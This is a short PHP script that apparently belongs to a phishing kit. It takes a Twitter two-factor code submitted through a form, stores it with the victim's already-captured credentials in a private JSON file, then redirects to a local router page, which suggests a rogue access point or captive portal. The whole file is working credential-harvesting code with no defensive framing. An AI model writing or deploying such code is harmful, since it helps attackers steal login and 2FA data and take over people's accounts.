<?php
$file = '../datos-privados.json';
$uuid = $_POST['uuid'];

$credentials = json_decode(file_get_contents($file), true); 

$new_credentials = [];

foreach ($credentials as $uuid_credential => $credential) {
	$new_credentials[$uuid_credential] = $credential;
	if ($uuid == $uuid_credential) {
		$new_credentials[$uuid]['sms'] = $_POST['2fa_twitter'];
	}
 }

file_put_contents($file,json_encode($new_credentials));

?><meta http-equiv="refresh" content="0; url=http://192.168.1.1/index.php" />